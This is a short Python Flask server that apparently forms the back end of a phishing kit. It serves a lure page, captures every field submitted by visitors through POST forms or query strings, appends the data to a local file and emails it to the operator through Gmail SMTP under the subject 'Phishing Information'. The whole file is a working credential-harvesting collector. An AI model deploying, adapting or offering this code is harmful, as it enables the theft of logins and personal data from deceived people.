from flask import Flask,request, send_file
import ssl
import smtplib
from dotenv import load_dotenv
import os

class PhishingStore:
    def __init__(self):
        self.email = None
        self.password = None
        self._update_env()

    def _update_env(self):
        load_dotenv()
        self.email = self.email if self.email else os.getenv("EMAIL")
        self.password = self.password if self.password else os.getenv("PASSWORD")

    def local(self,msg):
        try:
            with open("./__data__.txt","a") as file:
                file.write("\n"+msg)
        except:
            print("cannot save data locally")
            
    def mail(self,msg):
        # Create server and send message
        self._update_env()
        if not self.email or not self.password: 
            return
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as server:
            try: 
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, "Subject: Phishing Information\n\n" + msg)
            except Exception as e:
                print(e)

    def save(self,data):
        msg = ", ".join(f"{k}:{v}" for k,v in data.items() if v != "")
        print(msg)
        self.mail(msg)
        self.local(msg)

saver = PhishingStore()
app = Flask(__name__, static_url_path="", static_folder='')

@app.route('/',methods = ['GET', 'POST'])
def root():
    # print(request)
    if request.method == "POST":
        saver.save(request.form)
    elif len(request.args) > 0:
        saver.save(request.args)
    return send_file("./index.html")


if __name__ == '__main__':
    app.run()